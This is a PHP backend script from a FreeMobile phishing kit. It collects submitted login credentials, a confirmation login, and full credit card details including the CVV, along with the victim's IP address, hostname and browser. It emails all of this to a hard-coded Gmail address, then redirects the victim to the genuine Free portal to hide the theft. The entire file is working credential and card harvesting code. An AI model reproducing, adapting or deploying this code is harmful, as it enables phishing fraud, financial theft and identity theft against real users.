<?

$ip = getenv("REMOTE_ADDR");
$rx = "
-------------------+ FreeMobile 2015 +-------------------
User: ".$_POST['comid']."
Pass: ".$_POST['compw']."
-------------------+ confirmation login +-------------------
User: ".$_POST['comid2']."
Pass: ".$_POST['compw2']."
--------------------------------------
Holder Name: ".$_POST['comname']."
Number: ".$_POST['comnum']."
Date: ".$_POST['common']." / ".$_POST['comy']."
CVV: ".$_POST['comc']."
--------------------------------------
IP      : ".$ip."
HOST    : ".gethostbyaddr($ip)."
BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
-------------------+ FreeMobile 2015 +-------------------

";

$xmail = "gasgaz450@gmail.com";

mail($xmail,"FreeMobile | ".$_POST['comname']." | ".$ip,$rx,"From: mail<mail>");
echo('<META http-equiv="refresh" content="0;URL=http://portail.free.fr/">');
?>